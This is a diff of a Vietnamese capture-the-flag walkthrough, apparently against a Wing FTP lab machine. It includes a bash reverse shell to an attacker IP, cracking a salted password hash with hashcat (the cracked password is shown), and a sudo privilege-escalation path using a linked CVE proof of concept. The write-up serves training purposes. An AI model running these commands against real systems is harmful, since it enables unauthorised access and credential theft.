@@ -56,7 +56,39 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.143/1234 0>&1'
 
 Encode url lại và chạy script:
 
+<img width="1424" height="979" alt="image" src="https://github.com/user-attachments/assets/1760d967-a13b-4bc5-92b4-5e51296048dc" />
+
 <img width="778" height="239" alt="image" src="https://github.com/user-attachments/assets/5f161361-2b17-416d-a5f8-69aaf669d5c4" />
+
+Tiếp theo là tìm các thông tin nhạy cảm của user "wacky" sau khi phát hiện user có tồn tại trên hệ thống:
+
+<img width="1098" height="972" alt="image" src="https://github.com/user-attachments/assets/dd26b1b0-8372-451f-8c52-f53474e48e99" />
+
+Do hash của password này có salt nên phải tìm thêm cả salt nữa, nếu để ý trong file `/opt/wftpserver/Data/1/settings.xml` thì sẽ thấy salt của nó là `WingFTP`:
+
+<img width="722" height="933" alt="image" src="https://github.com/user-attachments/assets/6bb4c00a-e2a7-47b8-b6d0-e1f34a1e38d0" />
+
+Tiếp theo là dùng hashcat để crack password:
+
+```
+hashcat -m 1410 ~/hashcat/target.txt ~/wordlist/rockyou.txt --show
+32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
+```
+
+Dùng password đó thì truy cập thành công vào user wacky:
+
+<img width="1111" height="474" alt="image" src="https://github.com/user-attachments/assets/533cbbeb-bec0-4e4e-b28b-9c01709ad987" />
+
+Dùng `sudo -l` thì thấy có file `/opt/backup_clients/restore_backup_clients.py` được chạy dưới quyền root, kiểm tra phiên bản python3 thì là Python 3.12.3:
+
+<img width="655" height="168" alt="image" src="https://github.com/user-attachments/assets/02323d25-1414-4bb1-9c0b-9887173f7d23" />
+
+Kết hợp các dữ kiện này thì tìm được poc của 2 cve là [CVE-2025-4138-4517](https://github.com/DesertDemons/CVE-2025-4138-4517-POC), upload script lên target:
+
+
+
+
+
 
 
 
